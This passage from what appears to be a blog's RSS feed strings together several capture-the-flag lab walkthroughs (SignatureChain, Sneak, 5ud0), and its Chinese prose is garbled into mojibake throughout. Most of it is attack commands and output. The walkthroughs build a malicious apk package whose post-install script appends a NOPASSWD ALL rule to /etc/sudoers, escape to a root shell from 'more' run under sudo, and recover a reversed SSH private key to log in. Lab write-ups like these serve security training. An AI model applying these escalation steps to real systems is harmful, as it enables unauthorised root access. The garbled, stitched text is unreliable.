Êàë‰ª¨ÁöÑÁõÆÊ†áÊòØ root ÊùÉÈôêÔºåÂõ†Ê≠§ÈúÄË¶ÅËøõË°åÊèêÊùÉ„ÄÇ

## 1. ÊèêÊùÉËá≥ superuser

Âú®Êûö‰∏æÁ≥ªÁªüÊó∂ÔºåÂèëÁé∞‰∏Ä‰∏™Âè™ÁõëÂê¨Âú®Êú¨Âú∞ `127.0.0.1:5000` ÁöÑÂèØÁñëÊúçÂä°„ÄÇ

```bash
localhost:~$ netstat -lntup
...
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -
...
localhost:~$ busybox nc 127.0.0.1 5000
Welcome to SignatureChain CTF over TCP!
Type 'view', 'submit', 'hint', or 'exit'
&gt; view
[
  {
    'index': 1,
    'sender': 'system',
    'recipient': 'alice',
    'amount': 100,
    'signature': '14ed219616014b683ae66d1ec2e098c84ff09695b33fff0a7652505e260be0aa',
    'note': '1'
  },
  {
    'index': 2,
    'sender': 'alice',
    'recipient': 'bob',
    'amount': 50,
    'signature': '08188ce485e280ba7d8c614a776a478d75ac2e985a535d1d126117ceb59ac952',
    'note': '2'
  }
]
&gt; hint
[Hint 1] Use 'view' to inspect part of the blockchain.
[Hint 2] The signature is just sha256(sender-&gt;recipient:amount).
[Hint 3] Try forging a valid signature with this knowledge.
[Hint 4] What if admin sent you 999 coins?
```

1. ‰ΩøÁî® `view` Êü•ÁúãÂå∫ÂùóÈìæÁöÑ‰∏ÄÈÉ®ÂàÜ„ÄÇ
2. Á≠æÂêçÂ∞±ÊòØ `sha256(sender-&gt;recipient:amount)`„ÄÇ
3. ËØïÁùÄÁî®Ëøô‰∫õÁü•ËØÜ‰º™ÈÄ†‰∏Ä‰∏™ÊúâÊïàÁöÑÁ≠æÂêç„ÄÇ
4. Â¶ÇÊûúÁÆ°ÁêÜÂëòÁªô‰Ω†ÂèëÈÄÅ‰∫Ü 999 ÊûöÁ°¨Â∏ÅÂë¢Ôºü

ËøûÊé•ËØ•ÊúçÂä°ÂêéÔºåÂèëÁé∞ÊòØ‰∏Ä‰∏™Âü∫‰∫éÂå∫ÂùóÈìæÁ≠æÂêçÁöÑ CTF ÊåëÊàò„ÄÇ

get‰∏çÂà∞ÔºåÊâíÊãâ‰∏Ä‰∏ãÂÖ∂‰ªñÂú∞Êñπ

```bash
localhost:~$ cd /opt/
localhost:/opt$ ls -al
total 16
drwxr-xr-x    4 root     root          4096 Jul 13 14:43 .
drwxr-xr-x   21 root     root          4096 Jul 13 18:06 ..
drwx--x--x    4 root     root          4096 Jul  9 16:53 containerd
drwxr-xr-x    2 root     root          4096 Jul 14 15:13 server
localhost:/opt$ cd server/
localhost:/opt/server$ ls -al
total 16
drwxr-xr-x    2 root     root          4096 Jul 14 15:13 .
drwxr-xr-x    4 root     root          4096 Jul 13 14:43 ..
-rw-r--r--    1 root     root            98 Jul 13 16:27 Dockerfile
-rw-r--r--    1 root     root          3667 Jul 13 16:21 server.py
localhost:/opt/server$ cat server.py
import socket
import threading
import json
import hashlib

FLAG = 'flag{superuser/f124cf868d5e3fa5a7de39f80a2f9a0e}'

# ... Ê≠§Â§ÑÁúÅÁï•Â§ßÈáè‰ª£Á†Å ...
```

ÊúâÊç∑ÂæÑÔºåÂìàÂìàÂìà

‰ª£Á†Å‰∏≠Á°¨ÁºñÁ†Å‰∫Ü‰∏Ä‰∏™ flagÔºö`flag{superuser/f124cf868d5e3fa5a7de39f80a2f9a0e}`„ÄÇÊ†πÊçÆ flag ÁöÑÊ†ºÂºèÔºåÊàë‰ª¨ÂèØ‰ª•Êé®Êñ≠Âá∫Â≠òÂú®‰∏Ä‰∏™Âêç‰∏∫ `superuser` ÁöÑÁî®Êà∑ÔºåÂÖ∂ÂØÜÁ†ÅÂèØËÉΩÊòØ `f124cf868d5e3fa5a7de39f80a2f9a0e`„ÄÇ

‰ΩøÁî®Ê≠§Âá≠ÊçÆÂàáÊç¢Áî®Êà∑ÊàêÂäü„ÄÇ

```bash
localhost:/opt/server$ cd /home/
localhost:/home$ su superuser
Password: 
/home $ id
uid=1001(superuser) gid=1001(superuser) groups=300(abuild),1001(superuser)
```

## 2. ÊèêÊùÉËá≥ root

Êàê‰∏∫ `superuser` ÂêéÔºåÊ£ÄÊü• `sudo` ÊùÉÈôê„ÄÇ

```bash
/home $ sudo -l
User superuser may run the following commands on localhost:
    (ALL) NOPASSWD: /sbin/apk
```

ËøôÊòØ‰∏Ä‰∏™ÂÖ≥ÈîÆÁ™ÅÁ†¥Âè£ÔºÅÊàë‰ª¨ÂèØ‰ª•Êó†ÈúÄÂØÜÁ†Å‰ª• root ÊùÉÈôêËøêË°å `apk` ÂëΩ‰ª§„ÄÇ`apk` ÊòØ Alpine Linux ÁöÑÂåÖÁÆ°ÁêÜÂô®„ÄÇÊàë‰ª¨ÂèØ‰ª•ÂàõÂª∫‰∏Ä‰∏™ÂåÖÂê´ÊÅ∂ÊÑèÂÆâË£ÖÂêéËÑöÊú¨ÁöÑËá™ÂÆö‰πâ `.apk` ÂåÖÔºåÁÑ∂ÂêéÁî® `sudo apk` Êù•ÂÆâË£ÖÂÆÉ„ÄÇËØ•ËÑöÊú¨Â∞Ü‰ª• root ÊùÉÈôêÊâßË°å„ÄÇ

**ÊèêÊùÉÊ≠•È™§Ôºö**

1.  **ÂàõÂª∫ÊÅ∂ÊÑèÂåÖÂ∑•‰ΩúÁõÆÂΩïÂíåÊñá‰ª∂**
    *   `APKBUILD`ÔºöÂÆö‰πâÂåÖÂêç„ÄÅÁâàÊú¨Á≠âÂÖÉ‰ø°ÊÅØ„ÄÇ
    *   `pwn.post-install`ÔºöÂÆâË£ÖÂêéË¶ÅÊâßË°åÁöÑËÑöÊú¨„ÄÇÊàë‰ª¨ÂèØ‰ª•Âú®ËøôÈáåÂÜôÂÖ•ÊèêÊùÉÂëΩ‰ª§„ÄÇ

```bash
# ÂàõÂª∫Â∑•‰ΩúÁõÆÂΩï
mkdir /tmp/malicious-pkg
cd /tmp/malicious-pkg

cat &lt;&lt; 'EOF' &gt; APKBUILD
pkgname=pwn
pkgver=1.0.0
pkgrel=0
pkgdesc='pwn'
arch='noarch'
license='GPL'
install='pwn.post-install'
package() {
    mkdir -p '$pkgdir'
}
EOF

# ÂÜôÂÖ•ÊÅ∂ÊÑèÂÆâË£ÖÂêéËÑöÊú¨ (‰æãÂ¶ÇÔºöÁªô‰∫à superuser ÂÆåÂÖ®ÁöÑ sudo ÊùÉÈôê)
cat &lt;&lt; 'EOF' &gt; pwn.post-install
#!/bin/bash
echo 'superuser ALL=(ALL:ALL) NOPASSWD: ALL' &gt;&gt; /etc/sudoers
EOF
```

2.  **ÁîüÊàêÁ≠æÂêçÂØÜÈí•Âπ∂ÊûÑÂª∫ÂåÖ**
    `abuild` Â∑•ÂÖ∑ÈúÄË¶ÅÁ≠æÂêçÂØÜÈí•Êù•ÊûÑÂª∫ÂåÖ„ÄÇ

```bash
# ÁîüÊàêÂØÜÈí•ÂØπ
abuild-keygen -a
# ÊûÑÂª∫ÂåÖ
abuild checksum
abuild -r
```

3.  **ÂÆâË£ÖÊÅ∂ÊÑèÂåÖÂπ∂ÊèêÊùÉ**
    ‰ΩøÁî® `sudo apk add` Âπ∂Âä†‰∏ä `--allow-untrusted` ÈÄâÈ°πÊù•ÂÆâË£ÖÊàë‰ª¨Ëá™Â∑±ÊûÑÂª∫ÁöÑÊú™Á≠æÂêçÂåÖ„ÄÇ

```bash
sudo apk add --allow-untrusted /home/superuser/packages/tmp/x86_64/pwn-1.0.0-r0.apk 
```

ÂÆâË£ÖËøáÁ®ã‰∏≠Ôºå`pwn.post-install` ËÑöÊú¨‰ºöË¢´ root ÊâßË°åÔºå`superuser` Áî®Êà∑Áé∞Âú®Êã•Êúâ‰∫ÜÊó†ÂØÜÁ†ÅÊâßË°å‰ªª‰Ωï `sudo` ÂëΩ‰ª§ÁöÑÊùÉÈôê„ÄÇ

```bash
localhost:/tmp/malicious-pkg$ sudo -l
User superuser may run the following commands on localhost:
    (ALL) NOPASSWD: /sbin/apk
    (ALL : ALL) NOPASSWD: ALL
```

4. **Ëé∑Âèñ Root Shell**

   ```bash
   localhost:/tmp/malicious-pkg$ sudo su
   /tmp/malicious-pkg # id
   uid=0(root) gid=0(root) groups=0(root),...
   ```

ÊúÄÂêéÔºåÂú® root ÁöÑÂÆ∂ÁõÆÂΩï‰∏ãÊâæÂà∞ÊúÄÁªàÁöÑ flag„ÄÇ

```bash
/tmp/malicious-pkg # cat /root/root.txt
flag{bd941f8fb8a7b5b1c34bd71a349d6d04}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_ajpsvr.html</guid><pubDate>Thu, 17 Jul 2025 01:06:27 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Sneak</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Sneak.html</link><description>![image-20250715221242195](https://7r1umphk.github.io/image/20250715221302013.webp)

ÁªßÁª≠Ë°•wp

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.186 08:00:27:d2:ee:10       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fb:d6:c6       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.972 seconds (129.82 hosts/sec). 4 responded
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p- 192.168.205.186
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 10:13 EDT
Nmap scan report for 192.168.205.186
Host is up (0.00014s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:D2:EE:10 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.05 seconds
                                                                          
```

Áúãweb

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl http://192.168.205.186/ -v                                                                 
*   Trying 192.168.205.186:80...
* Connected to 192.168.205.186 (192.168.205.186) port 80
* using HTTP/1.x
&gt; GET / HTTP/1.1
&gt; Host: 192.168.205.186
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Date: Tue, 15 Jul 2025 14:14:11 GMT
&lt; Server: Apache/2.4.62 (Debian)
&lt; Last-Modified: Sat, 12 Apr 2025 01:53:17 GMT
&lt; ETag: '6-6328b152a4f57'
&lt; Accept-Ranges: bytes
&lt; Content-Length: 6
&lt; Content-Type: text/html
&lt; 
index
* Connection #0 to host 192.168.205.186 left intact
                                             
```

Áæ§ÈáåÈù¢ÁöÑÊ®°ÊùøÔºåÈÇ£Áõ¥Êé•ÁàÜÁ†¥ÁõÆÂΩïÂêß

Êúâ‰∏™cms

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.186/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.186/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 280]
/.php                 (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 6]
/cms                  (Status: 301) [Size: 316] [--&gt; http://192.168.205.186/cms/]
```

ÁªßÁª≠ÁàÜÁ†¥

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.186/cms -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.186/cms
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 280]
/index.php            (Status: 500) [Size: 0]
/.php                 (Status: 403) [Size: 280]
/content              (Status: 301) [Size: 324] [--&gt; http://192.168.205.186/cms/content/]
/modules              (Status: 301) [Size: 324] [--&gt; http://192.168.205.186/cms/modules/]
/rss.php              (Status: 500) [Size: 0]
/core                 (Status: 301) [Size: 321] [--&gt; http://192.168.205.186/cms/core/]
/license.txt          (Status: 200) [Size: 2602]
/install              (Status: 301) [Size: 324] [--&gt; http://192.168.205.186/cms/install/]
/lib                  (Status: 301) [Size: 320] [--&gt; http://192.168.205.186/cms/lib/]
/config.php           (Status: 200) [Size: 0]
/styles               (Status: 301) [Size: 323] [--&gt; http://192.168.205.186/cms/styles/]
/robots.txt           (Status: 200) [Size: 104]
/.php                 (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]
/acp                  (Status: 301) [Size: 320] [--&gt; http://192.168.205.186/cms/acp/]
```

ÊâíÊãâ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl http://192.168.205.186/cms/license.txt   
-----YEK ETAVIRP HSSNEPO NIGEB-----
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
==wBGUABDIQArFWZuNFQtRWYzl3cMAAAAkn2WUqipD5tU8
-----END OPENSSH PRIVATE KEY-----
               
```

Âá∫Ë¥ßÂï¶ÔºåÂá∫Ë¥ßÂï¶ÔºåÂìàÂìàÂìà

ÁúãÁùÄÂÉèsshÁßÅÈí•Ôºå‰ΩÜÊòØÂ•ΩÂÉèË¢´Â§ÑÁêÜËøá

ÁúãËµ∑Êù•ÂÉèÂçïË°åÂèçËΩ¨ÔºåÂõ†‰∏∫Á¨¨‰∏ÄË°åÁöÑÂ§¥ÊòØË¢´revÁöÑÔºåÁ¨¨‰∫åË°åÊ≤°ÈóÆÈ¢òÔºåÊúÄÂêé‰∏ÄË°åÊ≤°ÈóÆÈ¢òÔºåÊâÄ‰ª•Áõ¥Êé•ÂèçËΩ¨ÂõûÂéªÂêß

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ cd ~/tmp                                                  
            
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/tmp]
‚îî‚îÄ$ curl http://192.168.205.186/cms/license.txt -o id_rsa
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2602  100  2602    0     0  1267k      0 --:--:-- --:--:-- --:--:-- 2541k
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/tmp]
‚îî‚îÄ$ awk 'NR%2==1 {system('echo \047'$0'\047 | rev'); next} 1' id_rsa &gt; id_rsa1
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/tmp]
‚îî‚îÄ$ chmod 600 id_rsa1                                    
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/tmp]
‚îî‚îÄ$ ssh-keygen -y -f id_rsa1
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMk/ZcOb/YUyfx7uI7lTYwamUZMR9vv6q97X+ga1pYrU0xLn910Czy+1chL3iNh7Ai45DepLnJrkRPejQ6TfeTmb2jL56R3YDygeIklQEPwI+y38FHg8wz44hir1CCcAn2dlV2Mi/MKtjVjMa2C8JYUWM065yTN5PMcrlY/1m6aAtJH8n7wpPh81SHYDY6C4KD8xF7yos5EMWhyuUa36Hg1R+uDFqgFCEl+Ixn3KBkDXFh0L/km0K5d4C8zr2NEQ5rEsDXfTb5Jn2hO7OJkGA7jtJDa917+e+X9sCdsB4PxFg5VzDWqREngHj7YoSd4QpQLgTC4Ca7YLP6RA2sQqpw9S/8ISOc4vnbbkdgDlYhRo49tLjAis97AtcxnhQImsNHmqHZWUmAbFuTHzpGOVhDmqLN3z/oZ8szRFG/yD7kowBGUhCbwfvGp1KgJYWGhpKE6zIwZA4CXndPHEox+LHXI+8IwXiQqiDOZw5HpFUD6NORUHzbUkpLd7jpjkOgqHs= sysadm@Sneak
```

ËøûÊé•

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/tmp]
‚îî‚îÄ$ ssh sysadm@192.168.205.186 -i id_rsa1
The authenticity of host '192.168.205.186 (192.168.205.186)' can't be established.
ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:4: [hashed name]
    ~/.ssh/known_hosts:6: [hashed name]
    ~/.ssh/known_hosts:7: [hashed name]
    ~/.ssh/known_hosts:12: [hashed name]
    ~/.ssh/known_hosts:14: [hashed name]
    ~/.ssh/known_hosts:15: [hashed name]
    ~/.ssh/known_hosts:16: [hashed name]
    ~/.ssh/known_hosts:17: [hashed name]
    (13 additional names omitted)
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.186' (ED25519) to the list of known hosts.
Linux Sneak 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
sysadm@Sneak:~$ id
uid=1002(sysadm) gid=1003(sysadm) groups=1003(sysadm)
sysadm@Sneak:~$ sudo -l
Matching Defaults entries for sysadm on Sneak:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sysadm may run the following commands on Sneak:
    (ALL) NOPASSWD: /usr/bin/more /var/log/custom/fake-cleanup.sh
```

moreÊòØ‰∏™ÂàÜÈ°µÂô®ÊâÄ‰ª•‰Ω†Áº©Â∞èÂ±èÂπïÊâßË°å/usr/bin/more /var/log/custom/fake-cleanup.shËÆ©‰ªñ‰∏ÄÈ°µÊòæÁ§∫‰∏ç‰∫ÜÂ∞±ÂèØ‰ª•‰∫Ü

![image-20250715222326570](https://7r1umphk.github.io/image/20250715222326683.webp)

&gt; [!Tip]
&gt;
&gt; sudo /usr/bin/more /var/log/custom/fake-cleanup.sh
&gt; ÁÑ∂ÂêéÊòæÁ§∫ÁôæÂàÜÊØî
&gt;
&gt; ËæìÂÖ•!/bin/bash

```
root@Sneak:/home/sysadm# iduid=0(root) gid=0(root) groups=0(root                   
root@Sneak:/home/sysadm# cat /root/root.txt /home/user/user.txt 
flag{root-36bee2f8db4943b0f6c9d16afe11d454}                                         
flag{user-9fcae37cb857fb5fc6f8d74c82a5d0ga}                                         
```

ÊàñËÄÖÊîπstty‰πüÂèØ‰ª•

```
sysadm@Sneak:~$ stty rows 2
sysadm@Sneak:~$ sudo /usr/bin/more /var/log/custom/fake-cleanup.sh
# System cleanup script - DO NOT MODIFY
!/bin/bash
root@Sneak:/home/sysadm# id
uid=0(root) gid=0(root) groups=0(root)
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Sneak.html</guid><pubDate>Tue, 15 Jul 2025 14:34:06 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_5ud0</title><link>https://7r1UMPHK.github.io/post/nei-bu-_5ud0.html</link><description>![image-20250715211044032](https://7r1umphk.github.io/image/20250715211044343.webp)

Ëøô‰∏™ÊâìÂÆå‰∫ÜÔºåË°•‰∏™wp

&gt; [!Tip]
&gt;
&gt; Áæ§ÈáåÊêû‰∫Ü‰∏Ä‰∏™Êàë‰ª¨Ëá™Â∑±Èù∂Êú∫ÁöÑwp‰ªìÂ∫ìÔºåÊÑüÂÖ¥Ë∂£ÁöÑÂèØ‰ª•Áúã‰∏Ä‰∏ã
&gt; https://github.com/hyhforevertop/Mazesec-writeups

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l                                       
[sudo] kali ÁöÑÂØÜÁ†ÅÔºö
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.185 08:00:27:8e:cd:d9       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fb:d6:c6       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.954 seconds (131.01 hosts/sec). 4 responded
                                                                                     
```

192.168.205.185

Êé¢ÊµãÊúçÂä°

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p- 192.168.205.185  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 09:11 EDT
Nmap scan report for 192.168.205.185
Host is up (0.00013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:8E:CD:D9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.42 seconds
                                                                       
```

Áúãweb

![image-20250715211201958](https://7r1umphk.github.io/image/20250715211202294.webp)

Èöè‰æøÁÇπ‰∏™Ë∂ÖÈìæÊé•ÂèëÁé∞Ë∑≥ËΩ¨textpattern.dsz

Âä†‰∏™hosts

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo vim /etc/hosts                                                                            
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ tail -n 1 /etc/hosts                     
192.168.205.185 textpattern.dsz
                              
```

![image-20250715211441278](https://7r1umphk.github.io/image/20250715211441521.webp)

ÁõÆÂΩïÁàÜÁ†¥

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ gobuster dir -u http://textpattern.dsz/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://textpattern.dsz/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 280]
/files                (Status: 301) [Size: 318] [--&gt; http://textpattern.dsz/files/]
/images               (Status: 301) [Size: 319] [--&gt; http://textpattern.dsz/images/]
/themes               (Status: 301) [Size: 319] [--&gt; http://textpattern.dsz/themes/]
/index.php            (Status: 200) [Size: 11506]
/sites                (Status: 301) [Size: 318] [--&gt; http://textpattern.dsz/sites/]
/css.php              (Status: 200) [Size: 0]
/.php                 (Status: 403) [Size: 280]
/README.txt           (Status: 200) [Size: 1152]
/INSTALL.txt          (Status: 200) [Size: 3080]
/LICENSE.txt          (Status: 200) [Size: 15170]
/rpc                  (Status: 301) [Size: 316] [--&gt; http://textpattern.dsz/rpc/]
Progress: 45805 / 1102800 (4.15%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 48835 / 1102800 (4.43%)
===============================================================
Finished
===============================================================
```

ÊâíÊãâ‰∫Ü‰∏Ä‰∏ãÔºåÂú®README.txtÁúãÂà∞‰∫ÜcmsÁöÑÁâàÊú¨Âè∑

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl http://textpattern.dsz/README.txt                          
Textpattern CMS 4.8.7

Released under the GNU General Public License.
